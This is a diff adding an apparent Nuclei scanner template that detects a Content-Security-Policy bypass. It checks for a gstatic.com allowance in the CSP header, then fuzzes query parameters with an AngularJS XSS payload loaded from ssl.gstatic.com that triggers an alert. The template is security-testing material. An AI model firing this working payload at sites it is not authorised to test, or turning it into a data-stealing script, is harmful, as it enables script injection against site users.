@@ -1,0 +1,55 @@
+id: gstatic-ssl-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - GStatic SSL
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,gstatic-ssl,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "gstatic.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: gstatic_ssl_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "gstatic_ssl_csp_xss == true"
+# digest: 4b0a00483046022100edf579b2dfeab835f5a74022f5fddb19fee927cffbd3c2f37fff3a1a4d12c9f9022100953c06e125fff02d140a3c0314a99e74542e465b52585cd3ee25e3b63f3d90dd:922c64590222798bb761d5b6d8e72950
